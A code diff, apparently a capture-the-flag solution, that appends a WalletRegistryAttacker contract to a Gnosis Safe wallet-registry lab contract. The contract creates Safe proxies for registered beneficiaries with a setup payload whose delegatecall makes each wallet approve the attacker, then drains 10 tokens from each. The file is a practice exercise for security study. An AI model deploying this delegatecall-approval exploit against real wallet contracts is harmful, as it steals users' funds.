@@ -6,7 +6,7 @@ import "solady/src/utils/SafeTransferLib.sol";
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
 import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
-
+import "hardhat/console.sol";
 /**
  * @title WalletRegistry
  * @notice A registry for Gnosis Safe wallets.
@@ -131,5 +131,50 @@ contract WalletRegistry is IProxyCreationCallback, Ownable {
             ),
             (address)
         );
+    }
+}
+
+
+import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
+import "../DamnValuableToken.sol";
+contract WalletRegistryAttacker {
+    WalletRegistry victim;
+    address masterCopy;
+    GnosisSafeProxyFactory factory;
+    DamnValuableToken private immutable token;
+
+    constructor(address _victim, address _masterCopy, address _factory, address _token) {
+        victim = WalletRegistry(_victim);
+        masterCopy = _masterCopy;
+        factory = GnosisSafeProxyFactory(_factory);
+        token = DamnValuableToken(_token);
+    }
+
+    
+
+    function attack(address[] calldata victims) external {
+        for(uint i; i < victims.length; ++i) {
+            address[] memory setupFirstArg = new address[](1);
+            setupFirstArg[0] = victims[i];
+            bytes memory payload = abi.encodeWithSelector(
+                GnosisSafe.setup.selector,
+                setupFirstArg,
+                1,
+                address(this),  // `to`, used for delegatecall
+                abi.encode(address(this)), // `data`, pass the attacker contract address, as context will change
+                address(0),0,0,0
+            );
+
+           GnosisSafeProxy wallet = factory.createProxyWithCallback(masterCopy, payload, i+1000, IProxyCreationCallback(victim));
+           token.transferFrom(address(wallet), msg.sender, 10 ether);
+        }
+    }
+    
+    fallback(bytes calldata) external returns (bytes memory) {
+        address addr;
+        assembly{
+            addr := calldataload(0)
+        }
+        token.approve(addr, 10 ether);
     }
 }
